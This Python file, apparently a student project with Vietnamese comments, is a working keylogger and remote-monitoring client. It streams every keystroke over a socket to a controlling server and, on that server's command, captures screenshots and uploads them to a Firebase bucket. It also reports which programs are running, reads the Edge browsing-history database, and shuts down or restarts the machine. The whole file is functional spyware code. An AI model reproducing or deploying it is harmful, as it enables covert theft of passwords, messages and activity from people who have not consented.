import sqlite3
from pynput.keyboard import Listener
import socket
import pyautogui
from datetime import datetime
import time
import os
import psutil
import firebase_admin
from firebase_admin import credentials, storage

cred = credentials.Certificate("credentials.json")
firebase_admin.initialize_app(cred, {"storageBucket": "pbl4-09092003.appspot.com"})


clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverParent = '192.168.1.5'
serverPort = 8080


try:
    clientSocket.connect((serverParent, serverPort))
except Exception as e:
    print("Error connecting to server:", str(e))
if clientSocket:
    print("connecting to server")

def on_press(key):
    try:
        key = str(key)
        key = key.replace("'", "")
        if key == "Key.f12":
            raise SystemExit(0)
        clientSocket.sendall(key.encode('utf-8'))
    except Exception as e:
        print("Error: " + str(e))

def takeScreenshot():
    now = datetime.now()
    nameScreen = "screenshot-" + now.strftime("%Y%m%d-%H%M%S") + ".png"
    print("Name Screen: ", nameScreen)
    try:
        screenshot = pyautogui.screenshot()
        if screenshot:
            print("successfully taken screenshot")
        else:
            print("Failed to take screenshot")
        screenshot.save(nameScreen)
        
        # Lưu ảnh vào Firebase Storage
        bucket = storage.bucket()
        
        destination = 'images/' + nameScreen
        blob = bucket.blob(destination)
        blob.upload_from_filename(nameScreen)
        
        # Gửi link ảnh public  đến server
        # link = blob.public_url
        link = blob.generate_signed_url(expiration= int(time.time()) + 3600) 
        print("Link: ",  link)
        clientSocket.send(link.encode('utf-8'))
        
        # # Generate a download URL
        # download_url = blob.generate_signed_url(expiration=300)  # Adjust expiration time as needed
        # print("Download URL: ", download_url)
        # clientSocket.send(download_url.encode('utf-8'))

    except Exception as e:
        print("Error: " + str(e))

def getAppHistory():
    current_apps = set()
    while True:
        # Lấy danh sách các ứng dụng đang chạy
        running_apps = {process.name() for process in psutil.process_iter() if process.name().endswith('.exe')}
        
        new_apps = running_apps - current_apps
        closed_apps = current_apps - running_apps
        
        for app in new_apps:
            # print(f"New App: {app}")
            app_new = "New App: {}".format(app)
            print(app_new)
            clientSocket.send(app_new.encode('utf-8'))
        
        for app in closed_apps:
            # print(f"Closed App: {app}")
            app_close = "Closed App: {}".format(app)
            print(app_close)            
            clientSocket.send(app_close.encode('utf-8'))
        
        current_apps = running_apps
        
        time.sleep(1)
def get_edge_history():
    while True:
        
        # Đường dẫn đến cơ sở dữ liệu lịch sử của Microsoft Edge
        data_path = os.path.expanduser('~') + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"


        # Kết nối đến cơ sở dữ liệu lịch sử
        try:
            connection = sqlite3.connect(data_path)
            cursor = connection.cursor()

            # Thực hiện truy vấn để lấy dữ liệu lịch sử
            cursor.execute('SELECT * FROM urls')
            history = cursor.fetchall()

            for row in history:
                url, title, last_visit_time = row
                print(f"{last_visit_time}: {title} - {url}")

                # clientSocket.send(web.encode('utf-8'))
            cursor.close()
            connection.close()      
            time.sleep(5)

        except sqlite3.OperationalError as e:
            print(e)
def get_browsing_history():
    while True:
        
        db_path = os.path.expanduser('~') + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
        # db_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default'


        # Kết nối đến cơ sở dữ liệu SQLite
        connection = sqlite3.connect(db_path)
        cursor = connection.cursor()

        # Truy vấn để lấy lịch sử truy cập web
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
        results = cursor.fetchall()

        # In lịch sử truy cập web
        print("Browsing History:")
        for row in results:
            url, title, last_visit_time = row
            print(f"{last_visit_time}: {title} - {url}")

        # Đóng kết nối
        cursor.close()
        connection.close()

        # Chờ 5 giây trước khi lấy dữ liệu tiếp theo
        time.sleep(5)
           
with Listener(on_press=on_press) as parent:
    try:
        while True:
            message = clientSocket.recv(1024).decode('utf-8')
            print("Message:" + message)
            if message == 'takeScreenshot':
                takeScreenshot()
            elif message == 'appHistory':
                getAppHistory()
            elif message == 'webHistory':
                get_edge_history()    
            elif message == 'shutdown':
                os.system("shutdown /s /t 1")
            elif message == 'restart':
                os.system("shutdown /r /t 1")

    except Exception as e:
        print("Error: " + str(e))
    finally:
        parent.stop()
        parent.join()
        